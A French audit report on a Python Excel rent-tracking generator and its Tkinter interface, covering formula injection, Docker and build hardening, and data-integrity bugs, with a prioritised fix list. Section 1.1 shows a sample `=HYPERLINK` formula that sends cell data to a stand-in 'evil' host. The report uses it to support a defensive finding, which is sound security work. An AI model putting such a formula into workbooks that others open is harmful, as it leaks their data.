# Rapport d'audit — Suivi des loyers

Audit du code Python et de la sécurité du générateur de classeurs Excel + interface Tkinter.

- **Périmètre** : `generer_suivi_loyers.py`, `interface.py`, `build.bat`, `Dockerfile`, `docker-compose.yml`, `Makefile`.
- **Modèle de menace** : usage local mono-utilisateur (Windows), surface réseau nulle. Deux entrées potentiellement non fiables : un fichier de config (YAML/JSON) d'origine externe, et un classeur `.xlsx` ouvert ensuite par un tiers.
- **Verdict global** : aucune vulnérabilité critique ou élevée. Bons réflexes déjà présents (`yaml.safe_load`, `_slug`, échappement des apostrophes dans `_ref`, `configs` monté en lecture seule, formules par référence de cellule). Un seul correctif à réelle valeur sécurité (injection de formule `=`), et deux défauts d'intégrité des données à traiter en priorité.

---

## 1. Sécurité

### 1.1 Injection de formule Excel (préfixe `=`) — Moyen (réel)

openpyxl classe en **formule** toute chaîne de cellule commençant par `=`. Les autres préfixes CSV (`+`, `-`, `@`) sont écrits comme texte et **non** réinterprétés à l'ouverture d'un `.xlsx` : **seul `=` est un vecteur réel ici**.

Champs utilisateur écrits comme valeurs sans neutralisation : identité locataire, `identifiant`, `adresse`, `type_bien`, `observation` (onglet Locataires, feuilles locataire, Données, Bilan, IRL, Régularisation) ; `nom`/`adresse`/`tel`/`email` du bailleur (documents).

Exemple : un locataire nommé `=HYPERLINK("http://evil/"&A1,"cliquez")` ou `=WEBSERVICE(...)` provenant d'un fichier de config externe produit une formule active dans le classeur ouvert par un tiers (exfiltration / hameçonnage, sans alerte bloquante d'Excel pour `HYPERLINK`/`WEBSERVICE`).

**Correctif** : helper d'écriture centralisé qui force le type chaîne quand la valeur commence par un préfixe dangereux.

```python
_PREFIXES_DANGEREUX = ("=", "+", "-", "@")

def ecrire_texte(ws, row, col, valeur):
    cell = ws.cell(row, col, valeur)
    if isinstance(valeur, str) and valeur.startswith(_PREFIXES_DANGEREUX):
        cell.data_type = "s"  # force 'chaîne', neutralise la formule
    return cell
```

Remplacer les `ws.cell(r, c, <champ_utilisateur>)` par `ecrire_texte(...)`, et ajouter un test (`nom = "=1+1"` doit rester du texte).

### 1.2 Désérialisation — Conforme

`yaml.safe_load` (moteur + interface) et `json.loads` partout. Aucun `yaml.load` non sécurisé, `pickle` ni `eval`. **Maintenir cette discipline.**

### 1.3 Traversée de chemin — Faible (théorique)

`_slug` réduit à `[^\w\-]+ → _` : ni `/`, `\`, `.` ni `..` ne survivent. `_nom_feuille` retire `[]:*?/\` et tronque à 31. Les chemins de sortie réels viennent de l'utilisateur local (argv / filedialog). **Aucun correctif requis** ; conserver cette normalisation pour tout futur nom dérivé d'une entrée.

### 1.4 Formules construites (SUMIFS/VLOOKUP/validations) — Faible (maîtrisé)

Les identités servent de **valeurs** ensuite **référencées**, pas de littéraux concaténés → un nom avec apostrophe/guillemet ne casse pas la formule. `_ref` double les apostrophes des noms de feuille. Les listes de validation sont bâties à partir de **constantes** uniquement. Recommandation défensive : garder l'invariant « toute référence de feuille passe par `_ref` » (ou retirer aussi `'` dans `_CAR_INTERDITS`).

### 1.5 `build.bat` — Faible

- `taskkill /F` après consentement explicite, cible étroite : acceptable.
- `set /p REP` utilisé seulement en comparaison : pas d'injection de commande.
- **Dépendances non figées** (`pip install -r requirements.txt pyinstaller`) : chaîne d'approvisionnement non épinglée. Correctif : versions exactes, idéalement `--require-hashes` + `requirements.lock`.

### 1.6 Docker — Faible

- Conteneur en **root** (pas de `USER`) → fichiers `.xlsx` créés en root sur l'hôte (déjà contourné dans le Makefile). Correctif : `docker compose run --user "$(id -u):$(id -g)"` ou `USER app` dans le Dockerfile.
- Image `python:3.12-slim` non figée par digest (reproductibilité). Optionnel : épingler par `sha256`.
- `configs:ro` : bon réflexe à conserver. Défense en profondeur possible : `network_mode: "none"`.

### 1.7 Divers — Info / Faible

- `except Exception: pass` muets (`ChampDate.set_state`, `_ouvrir_dossier`) : restreindre aux exceptions attendues (ex. `tk.TclError`).
- `_parse_nombre` accepte `nan`/`inf` : ajouter un garde `math.isfinite`.
- `load_workbook` sur un fichier existant : risque théorique de zip-bomb si le fichier vient d'un tiers (pas de XXE pratique avec openpyxl). Info en mono-utilisateur.
- Le `*.config.json` contient de la **PII en clair** (nom/adresse/tél/e-mail) : attendu, mais à documenter (dépôt non chiffré, OneDrive).

---

## 2. Qualité & correctness du code

### M1 — Locataires homonymes : double comptage et corruption des saisies (Majeur)

L'identité `_identite(loc)` = « Nom Prénom » sert de critère `SUMIFS`, de valeur colonne `locataire` dans Données, et de clé de préservation. Son unicité n'est **pas** garantie. Deux « Nom Prénom » identiques →
- Bilan : lignes affichant la somme combinée + TOTAL doublé ;
- Préservation : la clé `(nom, année, mois)` écrase une occurrence par l'autre → saisies réinjectées dans le mauvais locataire ;
- IRL : même collision.

Les noms de feuille restent uniques (désambiguïsation par identifiant), ce qui **masque** le bug.

**Correctif** : valider l'unicité de `_identite` dans `valider_config` (erreur claire), ou utiliser une clé interne réellement unique (index locataire) propagée dans Données/Bilan/préservation.

### M2 — Validation tardive des montants et dates (Majeur)

`valider_config` ne contrôle ni montants ni dates ; l'erreur ne surgit qu'à la construction (`float`, `date.fromisoformat`), loin du point d'entrée → message générique en GUI, traceback brut en CLI.

**Correctif** : valider montants et dates dans `valider_config` avec messages ciblés (« Locataire #3 : loyer non numérique »), et vérifier `date_sortie >= date_entree`.

### M3 — Fermer la boîte « Conserver les saisies ? » détruit les données (Majeur)

`askyesno` : fermer la fenêtre (croix/Échap) renvoie `False` → `preserver=False` → régénération **vierge**, saisies perdues sans confirmation.

**Correctif** : `askyesnocancel` ; traiter `None` comme un abandon de la génération (return).

### Mineurs

- **m1** — Spinbox année vidé → `tk.TclError` (pas `ValueError`) non rattrapée : « Générer » ne fait rien. Élargir le `except` à `(ValueError, tk.TclError)`.
- **m2** — Le classeur existant est rechargé 3 fois (récolte saisies/régul/IRL). Charger une fois et partager l'objet.
- **m3** — Couplage interface ↔ moteur via API « privée » (`moteur._slug`). Exposer un contrat public (`nom_fichier_suivi(bailleur)`).
- **m4** — Statut « À encaisser » sur un mois à 0 € dû. Tester `total_du=0` d'abord.
- **m5** — Date de paiement quittance erronée si seule la CAF a payé (`SUMIFS(LocDate)=0` → `00/01/1900`). Garder la date locataire seulement si `LocRecu>0`.
- **m6** — Listes de validation « inline » plafonnées à ~255 car. : OK aujourd'hui, mais basculer sur plage nommée au-delà d'un seuil.
- **m7** — Renommer un locataire perd ses saisies silencieusement (clé = nom). Signaler les saisies non réappariées après régénération.
- **m8** — `migrer_config` ne normalise pas la casse des clés de modules ni n'avertit sur clé inconnue. Normaliser (`.lower()`) + avertir.

### Points vérifiés comme sains

Index de colonnes inter-feuilles (`VLOOKUP`/`SUMIFS`) corrects ; `_nom_feuille` gère >31 car., caractères interdits et collisions ; pas de mutation des entrées (`migrer_config` copie) ; locataire sans mois actif ne plante pas ; totaux annuels `SUM(y0:r-1)` sans off-by-one.

---

## 3. Plan d'action priorisé

1. **M1** — unicité d'identité / clé interne stable (intégrité des données, homonymes).
2. **M3** — `askyesnocancel` sur la préservation (évite la perte de saisies).
3. **M2** + **m1** — validation montants/dates/années avec messages exploitables.
4. **Sécurité 1.1** — neutraliser le préfixe `=` (`ecrire_texte`) + test.
5. **Sécurité 1.6 / 1.5** — Docker non-root, épinglage des dépendances.
6. Mineurs m2–m8 selon disponibilité.
